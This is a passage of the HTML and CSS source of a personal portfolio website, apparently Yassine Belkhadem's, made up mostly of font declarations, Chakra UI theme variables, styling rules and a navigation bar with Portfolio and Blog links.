format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__J9CYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYI0v0BnYASNr7.woff2) format('woff2');unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Sen';font-style:normal;font-weight:800;font-display:swap;src:url(https://fonts.gstatic.com/s/sen/v7/6xKudSxYI9__O9OYLUv0BnYASA.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next" data-reactroot=""><style data-emotion="css-global 3v2x1q">:host,:root{--chakra-ring-inset:var(--chakra-empty,/*!*/ /*!*/);--chakra-ring-offset-width:0px;--chakra-ring-offset-color:#fff;--chakra-ring-color:rgba(66, 153, 225, 0.6);--chakra-ring-offset-shadow:0 0 #0000;--chakra-ring-shadow:0 0 #0000;--chakra-space-x-reverse:0;--chakra-space-y-reverse:0;--chakra-colors-transparent:transparent;--chakra-colors-current:currentColor;--chakra-colors-black:#000000;--chakra-colors-white:#FFFFFF;--chakra-colors-whiteAlpha-50:rgba(255, 255, 255, 0.04);--chakra-colors-whiteAlpha-100:rgba(255, 255, 255, 0.06);--chakra-colors-whiteAlpha-200:rgba(255, 255, 255, 0.08);--chakra-colors-whiteAlpha-300:rgba(255, 255, 255, 0.16);--chakra-colors-whiteAlpha-400:rgba(255, 255, 255, 0.24);--chakra-colors-whiteAlpha-500:rgba(255, 255, 255, 0.36);--chakra-colors-whiteAlpha-600:rgba(255, 255, 255, 0.48);--chakra-colors-whiteAlpha-700:rgba(255, 255, 255, 0.64);--chakra-colors-whiteAlpha-800:rgba(255, 255, 255, 0.80);--chakra-colors-whiteAlpha-900:rgba(255, 255, 255, 0.92);--chakra-colors-blackAlpha-50:rgba(0, 0, 0, 0.04);--chakra-colors-blackAlpha-100:rgba(0, 0, 0, 0.06);--chakra-colors-blackAlpha-200:rgba(0, 0, 0, 0.08);--chakra-colors-blackAlpha-300:rgba(0, 0, 0, 0.16);--chakra-colors-blackAlpha-400:rgba(0, 0, 0, 0.24);--chakra-colors-blackAlpha-500:rgba(0, 0, 0, 0.36);--chakra-colors-blackAlpha-600:rgba(0, 0, 0, 0.48);--chakra-colors-blackAlpha-700:rgba(0, 0, 0, 0.64);--chakra-colors-blackAlpha-800:rgba(0, 0, 0, 0.80);--chakra-colors-blackAlpha-900:rgba(0, 0, 0, 0.92);--chakra-colors-gray-50:#F7FAFC;--chakra-colors-gray-100:#EDF2F7;--chakra-colors-gray-200:#E2E8F0;--chakra-colors-gray-300:#CBD5E0;--chakra-colors-gray-400:#A0AEC0;--chakra-colors-gray-500:#718096;--chakra-colors-gray-600:#4A5568;--chakra-colors-gray-700:#2D3748;--chakra-colors-gray-800:#1A202C;--chakra-colors-gray-900:#171923;--chakra-colors-red-50:#FFF5F5;--chakra-colors-red-100:#FED7D7;--chakra-colors-red-200:#FEB2B2;--chakra-colors-red-300:#FC8181;--chakra-colors-red-400:#F56565;--chakra-colors-red-500:#E53E3E;--chakra-colors-red-600:#C53030;--chakra-colors-red-700:#9B2C2C;--chakra-colors-red-800:#822727;--chakra-colors-red-900:#63171B;--chakra-colors-orange-50:#FFFAF0;--chakra-colors-orange-100:#FEEBC8;--chakra-colors-orange-200:#FBD38D;--chakra-colors-orange-300:#F6AD55;--chakra-colors-orange-400:#ED8936;--chakra-colors-orange-500:#DD6B20;--chakra-colors-orange-600:#C05621;--chakra-colors-orange-700:#9C4221;--chakra-colors-orange-800:#7B341E;--chakra-colors-orange-900:#652B19;--chakra-colors-yellow-50:#FFFFF0;--chakra-colors-yellow-100:#FEFCBF;--chakra-colors-yellow-200:#FAF089;--chakra-colors-yellow-300:#F6E05E;--chakra-colors-yellow-400:#ECC94B;--chakra-colors-yellow-500:#D69E2E;--chakra-colors-yellow-600:#B7791F;--chakra-colors-yellow-700:#975A16;--chakra-colors-yellow-800:#744210;--chakra-colors-yellow-900:#5F370E;--chakra-colors-green-50:#F0FFF4;--chakra-colors-green-100:#C6F6D5;--chakra-colors-green-200:#9AE6B4;--chakra-colors-green-300:#68D391;--chakra-colors-green-400:#48BB78;--chakra-colors-green-500:#38A169;--chakra-colors-green-600:#2F855A;--chakra-colors-green-700:#276749;--chakra-colors-green-800:#22543D;--chakra-colors-green-900:#1C4532;--chakra-colors-teal-50:#E6FFFA;--chakra-colors-teal-100:#B2F5EA;--chakra-colors-teal-200:#81E6D9;--chakra-colors-teal-300:#4FD1C5;--chakra-colors-teal-400:#38B2AC;--chakra-colors-teal-500:#319795;--chakra-colors-teal-600:#2C7A7B;--chakra-colors-teal-700:#285E61;--chakra-colors-teal-800:#234E52;--chakra-colors-teal-900:#1D4044;--chakra-colors-blue-50:#ebf8ff;--chakra-colors-blue-100:#bee3f8;--chakra-colors-blue-200:#90cdf4;--chakra-colors-blue-300:#63b3ed;--chakra-colors-blue-400:#4299e1;--chakra-colors-blue-500:#3182ce;--chakra-colors-blue-600:#2b6cb0;--chakra-colors-blue-700:#2c5282;--chakra-colors-blue-800:#2a4365;--chakra-colors-blue-900:#1A365D;--chakra-colors-cyan-50:#EDFDFD;--chakra-colors-cyan-100:#C4F1F9;--chakra-colors-cyan-200:#9DECF9;--chakra-colors-cyan-300:#76E4F7;--chakra-colors-cyan-400:#0BC5EA;--chakra-colors-cyan-500:#00B5D8;--chakra-colors-cyan-600:#00A3C4;--chakra-colors-cyan-700:#0987A0;--chakra-colors-cyan-800:#086F83;--chakra-colors-cyan-900:#065666;--chakra-colors-purple-50:#FAF5FF;--chakra-colors-purple-100:#E9D8FD;--chakra-colors-purple-200:#D6BCFA;--chakra-colors-purple-300:#B794F4;--chakra-colors-purple-400:#9F7AEA;--chakra-colors-purple-500:#805AD5;--chakra-colors-purple-600:#6B46C1;--chakra-colors-purple-700:#553C9A;--chakra-colors-purple-800:#44337A;--chakra-colors-purple-900:#322659;--chakra-colors-pink-50:#FFF5F7;--chakra-colors-pink-100:#FED7E2;--chakra-colors-pink-200:#FBB6CE;--chakra-colors-pink-300:#F687B3;--chakra-colors-pink-400:#ED64A6;--chakra-colors-pink-500:#D53F8C;--chakra-colors-pink-600:#B83280;--chakra-colors-pink-700:#97266D;--chakra-colors-pink-800:#702459;--chakra-colors-pink-900:#521B41;--chakra-colors-linkedin-50:#E8F4F9;--chakra-colors-linkedin-100:#CFEDFB;--chakra-colors-linkedin-200:#9BDAF3;--chakra-colors-linkedin-300:#68C7EC;--chakra-colors-linkedin-400:#34B3E4;--chakra-colors-linkedin-500:#00A0DC;--chakra-colors-linkedin-600:#008CC9;--chakra-colors-linkedin-700:#0077B5;--chakra-colors-linkedin-800:#005E93;--chakra-colors-linkedin-900:#004471;--chakra-colors-facebook-50:#E8F4F9;--chakra-colors-facebook-100:#D9DEE9;--chakra-colors-facebook-200:#B7C2DA;--chakra-colors-facebook-300:#6482C0;--chakra-colors-facebook-400:#4267B2;--chakra-colors-facebook-500:#385898;--chakra-colors-facebook-600:#314E89;--chakra-colors-facebook-700:#29487D;--chakra-colors-facebook-800:#223B67;--chakra-colors-facebook-900:#1E355B;--chakra-colors-messenger-50:#D0E6FF;--chakra-colors-messenger-100:#B9DAFF;--chakra-colors-messenger-200:#A2CDFF;--chakra-colors-messenger-300:#7AB8FF;--chakra-colors-messenger-400:#2E90FF;--chakra-colors-messenger-500:#0078FF;--chakra-colors-messenger-600:#0063D1;--chakra-colors-messenger-700:#0052AC;--chakra-colors-messenger-800:#003C7E;--chakra-colors-messenger-900:#002C5C;--chakra-colors-whatsapp-50:#dffeec;--chakra-colors-whatsapp-100:#b9f5d0;--chakra-colors-whatsapp-200:#90edb3;--chakra-colors-whatsapp-300:#65e495;--chakra-colors-whatsapp-400:#3cdd78;--chakra-colors-whatsapp-500:#22c35e;--chakra-colors-whatsapp-600:#179848;--chakra-colors-whatsapp-700:#0c6c33;--chakra-colors-whatsapp-800:#01421c;--chakra-colors-whatsapp-900:#001803;--chakra-colors-twitter-50:#E5F4FD;--chakra-colors-twitter-100:#C8E9FB;--chakra-colors-twitter-200:#A8DCFA;--chakra-colors-twitter-300:#83CDF7;--chakra-colors-twitter-400:#57BBF5;--chakra-colors-twitter-500:#1DA1F2;--chakra-colors-twitter-600:#1A94DA;--chakra-colors-twitter-700:#1681BF;--chakra-colors-twitter-800:#136B9E;--chakra-colors-twitter-900:#0D4D71;--chakra-colors-telegram-50:#E3F2F9;--chakra-colors-telegram-100:#C5E4F3;--chakra-colors-telegram-200:#A2D4EC;--chakra-colors-telegram-300:#7AC1E4;--chakra-colors-telegram-400:#47A9DA;--chakra-colors-telegram-500:#0088CC;--chakra-colors-telegram-600:#007AB8;--chakra-colors-telegram-700:#006BA1;--chakra-colors-telegram-800:#005885;--chakra-colors-telegram-900:#003F5E;--chakra-colors-darkBackground:#16222A;--chakra-colors-lightSecondary:#143258;--chakra-colors-cardDark:#25313A;--chakra-colors-cardDark2:#293640;--chakra-colors-darkSecondary:#CFE4FF;--chakra-colors-lightBackground:#ECEEF1;--chakra-borders-none:0;--chakra-borders-1px:1px solid;--chakra-borders-2px:2px solid;--chakra-borders-4px:4px solid;--chakra-borders-8px:8px solid;--chakra-fonts-heading:Iceland;--chakra-fonts-body:Iceland;--chakra-fonts-mono:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--chakra-fonts-display:Inversionz Unboxed;--chakra-fontSizes-xs:0.75rem;--chakra-fontSizes-sm:0.875rem;--chakra-fontSizes-md:1rem;--chakra-fontSizes-lg:1.125rem;--chakra-fontSizes-xl:1.25rem;--chakra-fontSizes-2xl:1.5rem;--chakra-fontSizes-3xl:1.875rem;--chakra-fontSizes-4xl:2.25rem;--chakra-fontSizes-5xl:3rem;--chakra-fontSizes-6xl:3.75rem;--chakra-fontSizes-7xl:4.5rem;--chakra-fontSizes-8xl:6rem;--chakra-fontSizes-9xl:8rem;--chakra-fontWeights-hairline:100;--chakra-fontWeights-thin:200;--chakra-fontWeights-light:300;--chakra-fontWeights-normal:400;--chakra-fontWeights-medium:500;--chakra-fontWeights-semibold:600;--chakra-fontWeights-bold:700;--chakra-fontWeights-extrabold:800;--chakra-fontWeights-black:900;--chakra-letterSpacings-tighter:-0.05em;--chakra-letterSpacings-tight:-0.025em;--chakra-letterSpacings-normal:0;--chakra-letterSpacings-wide:0.025em;--chakra-letterSpacings-wider:0.05em;--chakra-letterSpacings-widest:0.1em;--chakra-lineHeights-3:.75rem;--chakra-lineHeights-4:1rem;--chakra-lineHeights-5:1.25rem;--chakra-lineHeights-6:1.5rem;--chakra-lineHeights-7:1.75rem;--chakra-lineHeights-8:2rem;--chakra-lineHeights-9:2.25rem;--chakra-lineHeights-10:2.5rem;--chakra-lineHeights-normal:normal;--chakra-lineHeights-none:1;--chakra-lineHeights-shorter:1.25;--chakra-lineHeights-short:1.375;--chakra-lineHeights-base:1.5;--chakra-lineHeights-tall:1.625;--chakra-lineHeights-taller:2;--chakra-radii-none:0;--chakra-radii-sm:0.125rem;--chakra-radii-base:0.25rem;--chakra-radii-md:0.375rem;--chakra-radii-lg:0.5rem;--chakra-radii-xl:0.75rem;--chakra-radii-2xl:1rem;--chakra-radii-3xl:1.5rem;--chakra-radii-full:9999px;--chakra-space-1:0.25rem;--chakra-space-2:0.5rem;--chakra-space-3:0.75rem;--chakra-space-4:1rem;--chakra-space-5:1.25rem;--chakra-space-6:1.5rem;--chakra-space-7:1.75rem;--chakra-space-8:2rem;--chakra-space-9:2.25rem;--chakra-space-10:2.5rem;--chakra-space-12:3rem;--chakra-space-14:3.5rem;--chakra-space-16:4rem;--chakra-space-20:5rem;--chakra-space-24:6rem;--chakra-space-28:7rem;--chakra-space-32:8rem;--chakra-space-36:9rem;--chakra-space-40:10rem;--chakra-space-44:11rem;--chakra-space-48:12rem;--chakra-space-52:13rem;--chakra-space-56:14rem;--chakra-space-60:15rem;--chakra-space-64:16rem;--chakra-space-72:18rem;--chakra-space-80:20rem;--chakra-space-96:24rem;--chakra-space-px:1px;--chakra-space-0\.5:0.125rem;--chakra-space-1\.5:0.375rem;--chakra-space-2\.5:0.625rem;--chakra-space-3\.5:0.875rem;--chakra-shadows-xs:0 0 0 1px rgba(0, 0, 0, 0.05);--chakra-shadows-sm:0 1px 2px 0 rgba(0, 0, 0, 0.05);--chakra-shadows-base:0 1px 3px 0 rgba(0, 0, 0, 0.1),0 1px 2px 0 rgba(0, 0, 0, 0.06);--chakra-shadows-md:0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);--chakra-shadows-lg:0 10px 15px -3px rgba(0, 0, 0, 0.1),0 4px 6px -2px rgba(0, 0, 0, 0.05);--chakra-shadows-xl:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04);--chakra-shadows-2xl:0 25px 50px -12px rgba(0, 0, 0, 0.25);--chakra-shadows-outline:0 0 0 3px rgba(66, 153, 225, 0.6);--chakra-shadows-inner:inset 0 2px 4px 0 rgba(0,0,0,0.06);--chakra-shadows-none:none;--chakra-shadows-dark-lg:rgba(0, 0, 0, 0.1) 0px 0px 0px 1px,rgba(0, 0, 0, 0.2) 0px 5px 10px,rgba(0, 0, 0, 0.4) 0px 15px 40px;--chakra-sizes-1:0.25rem;--chakra-sizes-2:0.5rem;--chakra-sizes-3:0.75rem;--chakra-sizes-4:1rem;--chakra-sizes-5:1.25rem;--chakra-sizes-6:1.5rem;--chakra-sizes-7:1.75rem;--chakra-sizes-8:2rem;--chakra-sizes-9:2.25rem;--chakra-sizes-10:2.5rem;--chakra-sizes-12:3rem;--chakra-sizes-14:3.5rem;--chakra-sizes-16:4rem;--chakra-sizes-20:5rem;--chakra-sizes-24:6rem;--chakra-sizes-28:7rem;--chakra-sizes-32:8rem;--chakra-sizes-36:9rem;--chakra-sizes-40:10rem;--chakra-sizes-44:11rem;--chakra-sizes-48:12rem;--chakra-sizes-52:13rem;--chakra-sizes-56:14rem;--chakra-sizes-60:15rem;--chakra-sizes-64:16rem;--chakra-sizes-72:18rem;--chakra-sizes-80:20rem;--chakra-sizes-96:24rem;--chakra-sizes-px:1px;--chakra-sizes-0\.5:0.125rem;--chakra-sizes-1\.5:0.375rem;--chakra-sizes-2\.5:0.625rem;--chakra-sizes-3\.5:0.875rem;--chakra-sizes-max:max-content;--chakra-sizes-min:min-content;--chakra-sizes-full:100%;--chakra-sizes-3xs:14rem;--chakra-sizes-2xs:16rem;--chakra-sizes-xs:20rem;--chakra-sizes-sm:24rem;--chakra-sizes-md:28rem;--chakra-sizes-lg:32rem;--chakra-sizes-xl:36rem;--chakra-sizes-2xl:42rem;--chakra-sizes-3xl:48rem;--chakra-sizes-4xl:56rem;--chakra-sizes-5xl:64rem;--chakra-sizes-6xl:72rem;--chakra-sizes-7xl:80rem;--chakra-sizes-8xl:90rem;--chakra-sizes-container-sm:640px;--chakra-sizes-container-md:768px;--chakra-sizes-container-lg:1024px;--chakra-sizes-container-xl:1280px;--chakra-zIndices-hide:-1;--chakra-zIndices-auto:auto;--chakra-zIndices-base:0;--chakra-zIndices-docked:10;--chakra-zIndices-dropdown:1000;--chakra-zIndices-sticky:1100;--chakra-zIndices-banner:1200;--chakra-zIndices-overlay:1300;--chakra-zIndices-modal:1400;--chakra-zIndices-popover:1500;--chakra-zIndices-skipLink:1600;--chakra-zIndices-toast:1700;--chakra-zIndices-tooltip:1800;--chakra-transition-property-common:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform;--chakra-transition-property-colors:background-color,border-color,color,fill,stroke;--chakra-transition-property-dimensions:width,height;--chakra-transition-property-position:left,right,top,bottom;--chakra-transition-property-background:background-color,background-image,background-position;--chakra-transition-easing-ease-in:cubic-bezier(0.4, 0, 1, 1);--chakra-transition-easing-ease-out:cubic-bezier(0, 0, 0.2, 1);--chakra-transition-easing-ease-in-out:cubic-bezier(0.4, 0, 0.2, 1);--chakra-transition-duration-ultra-fast:50ms;--chakra-transition-duration-faster:100ms;--chakra-transition-duration-fast:150ms;--chakra-transition-duration-normal:200ms;--chakra-transition-duration-slow:300ms;--chakra-transition-duration-slower:400ms;--chakra-transition-duration-ultra-slow:500ms;--chakra-blur-none:0;--chakra-blur-sm:4px;--chakra-blur-base:8px;--chakra-blur-md:12px;--chakra-blur-lg:16px;--chakra-blur-xl:24px;--chakra-blur-2xl:40px;--chakra-blur-3xl:64px;}</style><style data-emotion="css-global 1jqlf9g">html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:system-ui,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-moz-osx-font-smoothing:grayscale;touch-action:manipulation;}body{position:relative;min-height:100%;font-feature-settings:'kern';}*,*::before,*::after{border-width:0;border-style:solid;box-sizing:border-box;}main{display:block;}hr{border-top-width:1px;box-sizing:content-box;height:0;overflow:visible;}pre,code,kbd,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:1em;}a{background-color:transparent;color:inherit;-webkit-text-decoration:inherit;text-decoration:inherit;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}b,strong{font-weight:bold;}small{font-size:80%;}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,input{overflow:visible;}button,select{text-transform:none;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}fieldset{padding:0.35em 0.75em 0.625em;}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}progress{vertical-align:baseline;}textarea{overflow:auto;}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{-webkit-appearance:none!important;}input[type="number"]{-moz-appearance:textfield;}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}[type="search"]::-webkit-search-decoration{-webkit-appearance:none!important;}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}details{display:block;}summary{display:-webkit-box;display:-webkit-list-item;display:-ms-list-itembox;display:list-item;}template{display:none;}[hidden]{display:none!important;}body,blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0;}button{background:transparent;padding:0;}fieldset{margin:0;padding:0;}ol,ul{margin:0;padding:0;}textarea{resize:vertical;}button,[role="button"]{cursor:pointer;}button::-moz-focus-inner{border:0!important;}table{border-collapse:collapse;}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit;}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit;}img,svg,video,canvas,audio,iframe,embed,object{display:block;}img,video{max-width:100%;height:auto;}[data-js-focus-visible] :focus:not([data-focus-visible-added]){outline:none;box-shadow:none;}select::-ms-expand{display:none;}</style><style data-emotion="css-global 4j7nz">body{font-family:var(--chakra-fonts-body);color:var(--chakra-colors-lightSecondary);background:var(--chakra-colors-lightBackground);transition-property:background-color;transition-duration:var(--chakra-transition-duration-normal);line-height:var(--chakra-lineHeights-base);}*::-webkit-input-placeholder{color:var(--chakra-colors-gray-400);}*::-moz-placeholder{color:var(--chakra-colors-gray-400);}*:-ms-input-placeholder{color:var(--chakra-colors-gray-400);}*::placeholder{color:var(--chakra-colors-gray-400);}*,*::before,::after{border-color:var(--chakra-colors-gray-200);word-wrap:break-word;}</style><style data-emotion="css 29kohe">.css-29kohe{display:grid;grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);z-index:var(--chakra-zIndices-banner);position:fixed;left:0px;top:0px;background-color:var(--chakra-colors-lightBackground);height:8vh;min-height:100px;width:var(--chakra-sizes-full);padding-left:var(--chakra-space-2);-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media screen and (min-width: 30em){.css-29kohe{grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-2);}}@media screen and (min-width: 48em){.css-29kohe{grid-column-gap:var(--chakra-space-2);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-4);}}@media screen and (min-width: 62em){.css-29kohe{grid-column-gap:var(--chakra-space-4);grid-template-columns:repeat(12,1fr);padding-left:var(--chakra-space-8);}}</style><div id="navbar-container" class="css-29kohe"><div class="navbar-header" id="navbar-header-container" style="opacity:0;transform:translateX(-20px) translateZ(0)"><style data-emotion="css 182iy1o">.css-182iy1o{font-family:var(--chakra-fonts-display);font-weight:var(--chakra-fontWeights-thin);font-size:var(--chakra-fontSizes-xl);line-height:1.33;cursor:pointer;padding-left:var(--chakra-space-1);text-align:center;}@media screen and (min-width: 30em){.css-182iy1o{font-size:var(--chakra-fontSizes-3xl);padding-left:var(--chakra-space-2);text-align:center;}}@media screen and (min-width: 48em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);line-height:1.2;padding-left:0px;text-align:center;}}@media screen and (min-width: 62em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);text-align:left;}}@media screen and (min-width: 80em){.css-182iy1o{font-size:var(--chakra-fontSizes-5xl);}}.css-182iy1o:hover,.css-182iy1o[data-hover]{color:var(--chakra-colors-lightSecondary);opacity:0.7;}</style><h2 class="chakra-heading css-182iy1o" id="navbar-header">Yassine Belkhadem</h2></div><style data-emotion="css 5w50zu">.css-5w50zu{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;overflow:visible;z-index:2;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);grid-column-start:3;grid-column-end:6;height:var(--chakra-sizes-full);width:var(--chakra-sizes-full);border-top:0;}@media screen and (min-width: 30em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 48em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 62em){.css-5w50zu{grid-column-start:6;grid-column-end:9;}}</style><div id="dropdown-menu-container" class="css-5w50zu"><style data-emotion="css z26yqd">.css-z26yqd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);width:var(--chakra-sizes-full);border-radius:2px;top:0px;position:absolute;z-index:2;padding-top:40px;border:0.4px solid;border-color:var(--chakra-colors-darkBackground);border-top:0;border-width:0;padding-bottom:0px;}.css-z26yqd>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-z26yqd" id="dropdown-menu"><div id="dropdown-menu-list" style="opacity:0;transform:scale(0.4) translateZ(0)"><style data-emotion="css 1elkzvy">.css-1elkzvy{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:999999px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-normal);height:var(--chakra-sizes-10);min-width:40px;font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:1.3125px;--chakra-scale-x:0.7;--chakra-scale-y:0.7;min-height:40px;background-color:var(--chakra-colors-lightBackground);border:0.4px solid;border-color:var(--chakra-colors-darkBackground);color:inherit;}.css-1elkzvy:focus,.css-1elkzvy[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1elkzvy[disabled],.css-1elkzvy[aria-disabled=true],.css-1elkzvy[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1elkzvy:hover,.css-1elkzvy[data-hover]{background:var(--chakra-colors-gray-200);}.css-1elkzvy:hover[disabled],.css-1elkzvy[data-hover][disabled],.css-1elkzvy:hover[aria-disabled=true],.css-1elkzvy[data-hover][aria-disabled=true],.css-1elkzvy:hover[data-disabled],.css-1elkzvy[data-hover][data-disabled]{background:var(--chakra-colors-gray-100);}@media screen and (min-width: 30em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 48em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 62em){.css-1elkzvy{min-width:50px;min-height:50px;}}.css-1elkzvy:active,.css-1elkzvy[data-active]{background:var(--chakra-colors-gray-300);}</style><button type="button" class="chakra-button css-1elkzvy" aria-label="Dropdown button"><svg color="lightBackground" xmlns="http://www.w3.org/2000/svg" height="30" width="30" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg></button></div><div class="chakra-collapse" style="overflow:hidden;display:none;opacity:0;height:0px"><style data-emotion="css 1xzsyzi">.css-1xzsyzi{height:10px;}</style><div class="css-1xzsyzi"></div><style data-emotion="css a8dr2z">.css-a8dr2z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);}.css-a8dr2z>*:not(style)~*:not(style){margin-top:var(--chakra-space-8);-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-a8dr2z" id="dropdown-menu-items"><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><style data-emotion="css oxy0a5">.css-oxy0a5{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;height:50px;font-family:Inversionz Unboxed;font-size:var(--chakra-fontSizes-2xl);}.css-oxy0a5:hover,.css-oxy0a5[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-oxy0a5:focus,.css-oxy0a5[data-focus]{box-shadow:var(--chakra-shadows-outline);}@media screen and (min-width: 30em){.css-oxy0a5{font-size:var(--chakra-fontSizes-2xl);}}@media screen and (min-width: 48em){.css-oxy0a5{font-size:var(--chakra-fontSizes-4xl);}}</style><a class="chakra-link css-oxy0a5" href="/">Portfolio</a></div><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><a class="chakra-link css-oxy0a5" href="/blog">Blog</a></div></div></div></div></div><style data-emotion="css 1ciw33x">.css-1ciw33x{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:1px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:500ms;height:var(--chakra-sizes-full);min-width:var(--chakra-sizes-10);font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:0px;-webkit-transition:all;transition:all;grid-column-start:6;background-color:var(--chakra-colors-lightBackground);}.css-1ciw33x:focus,.css-1ciw33x[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1ciw33x[disabled],.css-1ciw33x[aria-disabled=true],.css-1ciw33x[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1ciw33x:hover,.css-1ciw3